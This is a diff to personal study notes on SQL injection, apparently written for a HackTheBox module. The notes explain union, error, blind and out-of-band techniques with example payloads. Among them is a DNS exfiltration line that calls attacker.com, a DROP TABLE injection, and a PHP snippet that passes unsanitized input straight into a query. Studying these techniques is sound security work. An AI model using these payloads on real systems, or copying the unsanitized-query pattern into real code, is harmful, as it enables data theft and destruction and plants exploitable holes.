@@ -15,6 +15,57 @@ There are two types of databases, relational and non-relational -
     - Best for: Unstructured or rapidly changing data (social media posts, IoT sensors, content management)
     - Examples: MongoDB, Redis, Cassandra
 
+## 3 types of SQLi
+In-band - Where the attacker receives results directly in the same communication channel they used to send the attack. First choice when application shows database errors or results
+- Union based
+    - How it works: Uses the UNION operator to combine results from the original query with results from a malicious query
+    - Requirements: Both queries must have the same number of columns with compatible data types
+    - Process: Determine number of columns (ORDER BY or trial/error) --> Find which columns display data --> Extract information using UNION SELECT
+    - Example: `' UNION SELECT username,password FROM users-- -`
+    - 
+    - Best case scenario: Full database dump possible
+- Error based
+    - How it works: Forces the database to produce error messages that reveal information
+    - Process: Craft queries that cause deliberate errors containing sensitive data
+    - Example: `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
+    - Limitation: Only small amounts of data per error
+
+Blind - Where no direct output is returned, so attackers infer information based on application behavior.
+- Boolean (When application responds differently to true/false conditions)
+    - How it works: Sends queries that return True/False responses based on application behavior
+    - Process: Ask yes/no questions about the database
+    - Example:`' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'-- -` If page loads normally = True, if error/different page = False
+    - Characteristics: Slow process, requires many requests
+- Time based (When no visible differences exist, but timing can be measured)
+    - How it works: Uses database functions that cause delays to infer True/False
+    - Process: Measure response times to determine if conditions are met
+    - Example: `' AND IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a',SLEEP(5),0)-- -`
+    - Logic: If condition is true, page takes 5+ seconds to load
+    - Characteristics: Very slow, but works when no other feedback exists
+      
+Out-of-band - where it uses different communication channels to receive results (separate from the attack channel). Used w2hen all other methods fail, or for stealth/speed in advanced scenarios.
+- How it works:
+    - Triggers database to make external connections (HTTP, DNS, SMB)
+    - Data is sent to attacker-controlled external server
+    - Useful when in-band methods don't work due to firewalls/filtering
+
+- Common techniques:
+    - DNS exfiltration: `' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -`
+    - HTTP requests: Database makes HTTP calls to attacker's server with data in URL
+    - Email: Some databases can send emails with extracted data
+
+- Requirements:
+    - Database must have network access
+    - Specific database functions enabled (like xp_cmdshell in SQL Server)
+    - Attacker needs external infrastructure to receive data
+
+Characteristics:
+
+Most complex to set up
+Often fastest for large data extraction
+Bypasses many filtering mechanisms
+Requires advanced database privileges
+
 # Resources
 
 # Good Examples
@@ -42,9 +93,32 @@ There are two types of databases, relational and non-relational -
 # SQLi Bypasses
 
 # Notes
-- The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords. 
+- The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.
+- Similar to that of XSS, you need to first think about the context of where your input is getting placed inside the code, like here where we accept user input and pass it directly to the SQL query without sanitization:
+```
+$searchInput =  $_POST['findUser'];
+$query = "select * from logins where username like '%$searchInput'";
+$result = $conn->query($query);
+```
+- If we input SHOW `DATABASES;`, it would be executed as `'%SHOW DATABASES;'` and show us all usernames that are like SHOW DATABASES. What we want to do in this case is add (') which will end the user-input field, and after it, we can write actual SQL code: `1'; DROP TABLE users;`. Resulting in this code `select * from logins where username like '%1'; DROP TABLE users;'`
+
 
 # Tricks & Quirks
+Using PHP you can connect to a database and start using MySQL all within the PHP:
+```
+$conn = new mysqli("localhost", "root", "password", "users");
+$query = "select * from logins";
+$result = $conn->query($query);
+while($row = $result->fetch_assoc() ){
+	echo $row["name"]."<br>";
+}
+```
+This will store the queries output to `$result` and print it. Or this:
+```
+$searchInput =  $_POST['findUser'];
+$query = "select * from logins where username like '%$searchInput'";
+$result = $conn->query($query);
+```
 
 # HTB Module Questions
 ## SQL Injection Fundamentals 
